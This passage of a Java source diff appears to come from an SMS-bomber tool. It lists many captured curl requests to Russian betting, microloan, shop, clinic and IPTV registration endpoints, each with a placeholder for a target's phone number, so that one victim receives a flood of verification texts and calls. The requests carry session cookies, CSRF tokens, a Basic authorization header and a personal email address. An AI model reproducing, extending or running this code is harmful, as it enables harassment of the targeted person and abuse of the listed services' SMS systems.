+                        "  --data-raw '{\"phone\":\"{phone}\",\"g-recaptcha-response\":\"03AAYGu2T6PnQn3umlFWIku6kbPm0BdWLBNGeVOnPnqKT5XZVMlk9njp92GvqEjd9E2ndv5VUEeV-HbHztkiNsfmLa1xWzDYOkI5CUeq3RsdjIAvke_lnvRfAADsokPw4GO-t-0X2ZSsevRvqechami5n6mA45ZhynzyoUSeux0EjtLJqq60JKg9ajxddIinKF0RcGJuQOoQ7yPaBnzDHX0BnLfrLATjR0409ta2ahNK8PMmrDe13BjuomDW-Zp2SMklBSi776oi1FnNj_NM2apkfr8CB45tQjflYh4PyVcm4uFc9zmKntaRqYzacAv-CbdpCQGXD7eGaiBxLUuhYq8c1g2wUlvXKvN7qzci7kmd_TBodOjEiRv4VBt9O8NvMXarVVRZTKiuyFQbHympTA-o9CPjox-XIexqVdiFIAwwRJhMZvLhwfGUprH4Q07Y8h_1cEr5IgUJxoc9yABcGZWs3SKiabShLcVIEmhiCjdKm8n20y6Zqo0E5VQisLbdXqsuUvE92JCL01BaS2w3uf_sa_q88i-JLxHGk9SH5VRAKxF9T7qSkte5I\",\"authMethod\":\"call\"}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://clientsapi03.pb06e2-resources.com/cps/superRegistration/createProcess' \\\n" +
+                        "  -H 'Accept: */*' \\\n" +
+                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'Connection: keep-alive' \\\n" +
+                        "  -H 'Content-Type: text/plain;charset=UTF-8' \\\n" +
+                        "  -H 'Origin: https://www.pari.ru' \\\n" +
+                        "  -H 'Referer: https://www.pari.ru/content/registrationFrame.html?webview=true&type=registration&lang=ru&deviceId=E6F4B6A9491A13FFF74515E9EFF72ABE&sysId=2&platform=mobile_web&analyticsId=5836595265017988318&theme=pb_default&appVersion=3.116.1' \\\n" +
+                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
+                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
+                        "  -H 'Sec-Fetch-Site: cross-site' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  --data-raw '{\"fio\":\"\",\"password\":\"qwertyuiop123_\",\"email\":\"\",\"emailAdvertAccepted\":true,\"phoneNumber\":\"+{full_phone}\",\"webReferrer\":\"https://www.pari.ru/mobile/registration/start/\",\"advertInfo\":\"\",\"platformInfo\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\",\"promoId\":\"\",\"ecupis\":true,\"birthday\":\"2001-01-01\",\"sysId\":2,\"lang\":\"ru\",\"appVersion\":\"1.4.0\",\"deviceId\":\"E6F4B6A9491A13FFF74515E9EFF72ABE\"}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://mobicredit.ru/api/registration/send/code?mobilePhone={phone}&surname=%D0%9A%D0%9F%D0%BF%D0%BA%D0%BF%D0%BA%D0%BF%D0%BA&name=%D0%9F%D0%9A%D0%BF%D0%BA%D0%BF%D0%BA%D0%BF%D0%BA&patronymic=%D0%9F%D0%9A%D0%BF%D0%BA%D0%BF%D0%BA%D0%BF%D0%BA%D0%BF%D0%BA&email=riregeh@gmail.com&birthday=2001-01-01' \\\n" +
+                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
+                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'Connection: keep-alive' \\\n" +
+                        "  -H 'Content-Type: application/json' \\\n" +
+                        "  -H 'Cookie: _ga=GA1.1.2080063708.1689625029; _ga_4SJS2NYGNC=GS1.1.1689625029.1.0.1689625029.0.0.0; _ym_uid=168962502983121350; _ym_d=1689625029; _ym_isad=2; _ym_visorc=w; JSESSIONID=CA5802F4D9D13467A3296143467F74AD; clientaction_png=647b0204-8bfd-8c1b-8c72-d3c35b832e9a; clientaction_etag=647b0204-8bfd-8c1b-8c72-d3c35b832e9a; clientaction_cache=647b0204-8bfd-8c1b-8c72-d3c35b832e9a; CLIENTSESSION=647b0204-8bfd-8c1b-8c72-d3c35b832e9a' \\\n" +
+                        "  -H 'Origin: https://mobicredit.ru' \\\n" +
+                        "  -H 'Referer: https://mobicredit.ru/app/step1_register' \\\n" +
+                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
+                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
+                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  --data-raw '{}' \\\n" +
+                        "  --compressed"),
+
+                new CurlService("curl 'https://www.xn--e1agpbetw.xn--p1ai/clientSignup' \\\n" +
+                        "  -H 'Accept: */*' \\\n" +
+                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'Connection: keep-alive' \\\n" +
+                        "  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
+                        "  -H 'Cookie: PHPSESSID=0e1976630dcd18ff73b70122f87ab737; _csrf=400c66a45fc86334c0cf953163cfc5be4aee6406956e34534fe503c605c00013a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22QVscXt4Y3wrEoOEHTNNWhMlfMHwiu7iD%22%3B%7D; __session:0.20956442189629487:=https:; tmr_lvid=0123e87a3eef3eb57c70885594bb5810; tmr_lvidTS=1689625212520; _ym_uid=1689625213932765387; _ym_d=1689625213; _ym_isad=2; _ym_visorc=w; tmr_detect=0%7C1689625214824' \\\n" +
+                        "  -H 'Origin: https://www.xn--e1agpbetw.xn--p1ai' \\\n" +
+                        "  -H 'Referer: https://www.xn--e1agpbetw.xn--p1ai/clientLogin' \\\n" +
+                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
+                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
+                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
+                        "  -H 'X-CSRF-Token: OEUzaWNySkxpE0AKOwZ.FQsyQSwMPQ8EbAt9Pgs/Jip1DUQAFkUjCA==' \\\n" +
+                        "  -H 'X-Requested-With: XMLHttpRequest' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  --data-raw '_csrf=OEUzaWNySkxpE0AKOwZ.FQsyQSwMPQ8EbAt9Pgs%2FJip1DUQAFkUjCA%3D%3D&ClientLoginForm%5Bphone%5D=%2B7+{phone:***+***-**-**}&ClientLoginForm%5Bpassword%5D=gergergergerger&ClientLoginForm%5BrememberMe%5D=0&ClientLoginForm%5BrememberMe%5D=1&type=whatsapp' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://cnt-vlmr-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code' \\\n" +
+                        "  -H 'authority: cnt-vlmr-itv02.svc.iptv.rt.ru' \\\n" +
+                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'content-type: application/json' \\\n" +
+                        "  -H 'origin: https://wink.ru' \\\n" +
+                        "  -H 'referer: https://wink.ru/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: cross-site' \\\n" +
+                        "  -H 'session_id: e34bc78f-24df-11ee-8e4b-4857027601a0:1951416:2237006:2' \\\n" +
+                        "  -H 'x-wink-version: v2023.07.17.1651' \\\n" +
+                        "  --data-raw '{\"phone\":\"{full_phone}\",\"action\":\"register\"}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://clientsapi51w.bk6bba-resources.com/cps/superRegistration/createProcess' \\\n" +
+                        "  -H 'Accept: */*' \\\n" +
+                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'Connection: keep-alive' \\\n" +
+                        "  -H 'Content-Type: text/plain;charset=UTF-8' \\\n" +
+                        "  -H 'Origin: https://www.fon.bet' \\\n" +
+                        "  -H 'Referer: https://www.fon.bet/content/registrationFrame.html?webview=true&type=registration&lang=ru&deviceId=18EAC184CFA3CDB7F89C4D8D6C0A2A3A&sysId=2&platform=mobile_web&analyticsId=3801994895077200830&theme=light&appVersion=3.116.0' \\\n" +
+                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
+                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
+                        "  -H 'Sec-Fetch-Site: cross-site' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  --data-raw '{\"fio\":\"\",\"password\":\"Kiz624_9S\\u0021sLyQe\",\"email\":\"\",\"emailAdvertAccepted\":true,\"phoneNumber\":\"+{full_phone}\",\"webReferrer\":\"https://www.fon.bet/mobile/?utm_referrer=https%3A%2F%2Fyandex.ru%2F\",\"advertInfo\":\"\",\"platformInfo\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\",\"promoId\":\"\",\"ecupis\":true,\"birthday\":\"2001-01-01\",\"sysId\":2,\"lang\":\"ru\",\"appVersion\":\"1.4.0\",\"deviceId\":\"18EAC184CFA3CDB7F89C4D8D6C0A2A3A\"}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://my-shop.ru/cgi-bin/my_util2.pl?q=my_code_for_phone_confirmation&view_id=cad78c6d-6e8b-4443-abe9-f89658b37fe933a0b9054' \\\n" +
+                        "  -H 'authority: my-shop.ru' \\\n" +
+                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'authorization: Basic YmV0YXVzZXI6MFp2aVhlQW9HV0JNSmMxM0luYzE=' \\\n" +
+                        "  -H 'content-type: application/json;charset=UTF-8' \\\n" +
+                        "  -H 'cookie: uid=Cn8BFWS1pKkw/xhVi+JQAg==; sessionId=16896257731257771169; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _ga_J4L4FRCV76=GS1.1.1689625773.1.0.1689625773.60.0.0; tmr_lvid=3cb8a7cc3a81f281d0b3e01a43fd2fe3; tmr_lvidTS=1666886269304; _ga=GA1.2.2117831355.1689625773; _gid=GA1.2.2052941486.1689625773; _dc_gtm_UA-22340172-1=1; _ym_uid=1659887748410412768; _ym_d=1689625774; _ym_isad=2; _ym_visorc=w; adrdel=1; adrcid=AyWeQMx8O1DF95dsGKTDIsQ; tmr_detect=0%7C1689625775832' \\\n" +
+                        "  -H 'origin: https://my-shop.ru' \\\n" +
+                        "  -H 'referer: https://my-shop.ru/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-origin' \\\n" +
+                        "  --data-raw '{\"phone_code\":\"7\",\"phone\":\"{phone}\"}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://liniilubvi.ru/personal/profile/' \\\n" +
+                        "  -H 'authority: liniilubvi.ru' \\\n" +
+                        "  -H 'accept: */*' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
+                        "  -H 'cookie: __ddg1_=lsYhhTFvJnHY3859k5k9; experimentVariantId_ll8=11; PHPSESSID=4fc044ln5mj534skhbdmuqfsme; subscribe-popup=cookiesubscribe; _gid=GA1.2.542052269.1689625960; _ga_cid=760644780.1689625960; _gat=1; rrpvid=310761005772141; _ym_uid=1648576022483904673; _ym_d=1689625960; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _userGUID=0:lk7bo6wm:01syzn4RzCaxgsLsmwcxHR6TZDsuNt_c; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; rcuid=6275fcd65368be000135cd22; tmr_lvid=6e70a0a92ed7c32b08ffe1ce00fc57ba; tmr_lvidTS=1689625960650; __utma=117815316.760644780.1689625960.1689625961.1689625961.1; __utmc=117815316; __utmz=117815316.1689625961.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt_UA-32426418-13=1; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; __utmb=117815316.2.10.1689625961; _ga=GA1.1.760644780.1689625960; _ga_Q2GKTC7MRN=GS1.1.1689625960.1.1.1689625964.0.0.0; tmr_detect=0%7C1689625964792' \\\n" +
+                        "  -H 'origin: https://liniilubvi.ru' \\\n" +
+                        "  -H 'referer: https://liniilubvi.ru/personal/profile/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-origin' \\\n" +
+                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
+                        "  --data-raw 'state=1&phone={full_phone}' \\\n" +
+                        "  --compressed", 7),
+
+                new Service(7) {
+                    @Override
+                    public void run(OkHttpClient client, Callback callback, Phone phone) {
+                        new CurlService("curl 'https://www.clinic23.ru/api/' \\\n" +
+                                "  -H 'authority: www.clinic23.ru' \\\n" +
+                                "  -H 'accept: */*' \\\n" +
+                                "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                                "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
+                                "  -H 'cookie: PHPSESSID=c6d533e90ef751710b851d5c740f6b23; tmr_lvid=8f5515ca9a25fe90e176f7781cdea56b; tmr_lvidTS=1689626111677; cted=modId%3D67q5wngs%3Bclient_id%3D22258626.1689626112; _ym_uid=1689626112835738540; _ym_d=1689626112; _gid=GA1.2.126313026.1689626112; _dc_gtm_UA-112612622-1=1; _ym_isad=2; _ym_visorc=w; _ga_1F4Z28J2QS=GS1.1.1689626111.1.1.1689626113.58.0.0; _ga=GA1.2.22258626.1689626112; tmr_detect=0%7C1689626116366' \\\n" +
+                                "  -H 'origin: https://www.clinic23.ru' \\\n" +
+                                "  -H 'referer: https://www.clinic23.ru/lichnyi-kabinet' \\\n" +
+                                "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                                "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                                "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                                "  -H 'sec-fetch-dest: empty' \\\n" +
+                                "  -H 'sec-fetch-mode: cors' \\\n" +
+                                "  -H 'sec-fetch-site: same-origin' \\\n" +
+                                "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
+                                "  --data-raw 'method=lk%3Aauth&form%5Bphone%5D=%2B7+{phone:(***)+***-**-**}&form%5Brand%5D=" + new Random().nextInt(54323) + "&qt=' \\\n" +
+                                "  --compressed").run(client, callback, phone);
+                    }
+                },
+
+                new CurlService("curl 'https://imkosmetik.com/api-site/ajax/auth/ident-by-phone/' \\\n" +
+                        "  -H 'authority: imkosmetik.com' \\\n" +
+                        "  -H 'accept: application/json' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'content-type: application/x-www-form-urlencoded' \\\n" +
+                        "  -H 'cookie: PHPSESSID=869b3faf4f38464f62cc718f900c888c; _csrf=762c90aea0fdd3437c10433f980bba799b80645824da3999d3c90fae0ee6bdbea%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%2226uzoLtN3Et-ifCp5VR-hVvX__g8GGR5%22%3B%7D; rrpvid=444597250764043; tmr_lvid=789aa2bd5838f170e95206e8b97bba17; tmr_lvidTS=1689626347345; _ym_uid=1689626347269362291; _ym_d=1689626347; _gcl_au=1.1.2043127203.1689626348; _ym_isad=2; g4c_x=1; _ga_5BM073MHWB=GS1.1.1689626347.1.0.1689626347.60.0.0; _ga_52V9VXP3L4=GS1.1.1689626347.1.0.1689626347.0.0.0; _ga=GA1.2.1701739037.1689626348; _gid=GA1.2.265741333.1689626348; _gat_UA-226019876-1=1; _dc_gtm_UA-49352807-1=1; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; rcuid=6275fcd65368be000135cd22; _userGUID=0:lk7bwhze:Sidu1dOCmbKJPPzkq7FWjCil32woty6i; dSesn=2df5b1d5-e048-cb08-28a9-89620c0fce47; _dvs=0:lk7bwhze:Vv6rVQflPtsaTt0rJzl9ZcYYZ8gZ_J6u; cto_bundle=6rkTfF9aZGJadEt5VVR4VjBaQ1VaMTVDVFY1SW5UMndIRU9jQnVXdyUyRnJRWDljU0p0ZVVESFJPdlYlMkZkRWllRk1ETFEwdDBOVmk3Nnc0czUyJTJCMnljMHd0UlVSZmlqMmpnTkZWN2VJQ01BaEpKd3BmU01kUENpVHRjVXlRbmpGdzcwZ0JDVA; _ga_XDWXGNYGD9=GS1.2.1689626348.1.0.1689626348.0.0.0; _ym_visorc=w; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; tmr_detect=0%7C1689626350301; _gali=ga-login_code_get' \\\n" +
+                        "  -H 'origin: https://imkosmetik.com' \\\n" +
+                        "  -H 'referer: https://imkosmetik.com/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-origin' \\\n" +
+                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
+                        "  --data-raw '{\"phone\":\"+{full_phone}\"}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://knopkadengi.ru/api/registration/send/code?mobilePhone={phone}' \\\n" +
+                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
+                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'Connection: keep-alive' \\\n" +
+                        "  -H 'Content-Type: application/json' \\\n" +
+                        "  -H 'Cookie: clientaction_etag=undefined; clientaction_cache=undefined; _ym_uid=16612477371039330916; _ym_d=1689626470; _ym_isad=2; _ym_visorc=w; JSESSIONID=FCCAA5A5700C3A5742589C6FEE3B1E2D' \\\n" +
+                        "  -H 'Origin: https://knopkadengi.ru' \\\n" +
+                        "  -H 'Referer: https://knopkadengi.ru/registration/step1' \\\n" +
+                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
+                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
+                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  --data-raw '{}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://ifzshop.ru/signup/' \\\n" +
+                        "  -H 'authority: ifzshop.ru' \\\n" +
+                        "  -H 'accept: */*' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
+                        "  -H 'cookie: landing=%2Fsignup%2F; PHPSESSID=615srr5n1ei5gh4kr3fu4fos2p; __utma=137035368.190930219.1689626552.1689626552.1689626552.1; __utmc=137035368; __utmz=137035368.1689626552.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=137035368.1.10.1689626552; _ym_uid=1689626552157866640; _ym_d=1689626552; _ym_isad=2; pricetype_manual=0; pricetype=1; pricetype_set=1689626551; cityselect__country=rus; cityselect__show_notifier=1689626552; cityselect__city=%D0%98%D0%B6%D0%B5%D0%B2%D1%81%D0%BA; cityselect__region=18; cityselect__zip=426000' \\\n" +
+                        "  -H 'origin: https://ifzshop.ru' \\\n" +
+                        "  -H 'referer: https://ifzshop.ru/signup/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-origin' \\\n" +
+                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
+                        "  --data-raw 'data%5Bfirstname%5D=ewfefwef&data%5Bphone%5D=%2B{full_phone}&data%5Bbirthday%5D%5Bday%5D=&data%5Bbirthday%5D%5Bmonth%5D=4&data%5Bbirthday%5D%5Byear%5D=2001&wa_json_mode=1&need_redirects=1&contact_type=person' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://www.agatol.ru/sms/?action=sms_phone_sms_activation_get_cod&type_form=ajax&sms_type=registration&phone=%2B7+{phone:(***)+***-**-**}' \\\n" +
+                        "  -H 'Accept: text/plain, */*; q=0.01' \\\n" +
+                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'Connection: keep-alive' \\\n" +
+                        "  -H 'Cookie: CGISESSID=a248beb8ff393b3a411309b961af7ecf; tovar_recent_hash=d1fd85108cb14891abc823365ca6fccb; _ym_uid=1689626672374651798; _ym_d=1689626672; _ym_isad=2; _ym_visorc=w' \\\n" +
+                        "  -H 'Referer: https://www.agatol.ru/users_registration/' \\\n" +
+                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
+                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
+                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
+                        "  -H 'X-Requested-With: XMLHttpRequest' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://kva-kva.ru/local/components/strangebrain/registration/ajax/ajax-code.php/?action=send_code&codeType=sms&phone=%2B7{phone:(***)***-**-**}&mail=dmitrijkotov634%40gmail.com' \\\n" +
+                        "  -H 'authority: kva-kva.ru' \\\n" +
+                        "  -H 'accept: */*' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'cookie: PHPSESSID=VNSNu43qj6topf1IV37guajfY5B9MrDF; BITRIX_SM_SALE_UID=8671801; _gcl_au=1.1.905765990.1689626990; tmr_lvid=7939875507baf81e4e9959b8d7b54876; tmr_lvidTS=1689626990374; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1689627540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _gid=GA1.2.1704374175.1689626990; _gat_UA-146965423-1=1; _gat_gtag_UA_172622838_1=1; _ga_DEEHZW2Z9R=GS1.1.1689626990.1.0.1689626990.0.0.0; _ga=GA1.1.882603929.1689626990; _ym_uid=1689626990958593996; _ym_d=1689626990; _ym_isad=2; _ym_visorc=w; tmr_detect=0%7C1689626992818' \\\n" +
+                        "  -H 'referer: https://kva-kva.ru/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-origin' \\\n" +
+                        "  --compressed", 7)
         );
     }
 }
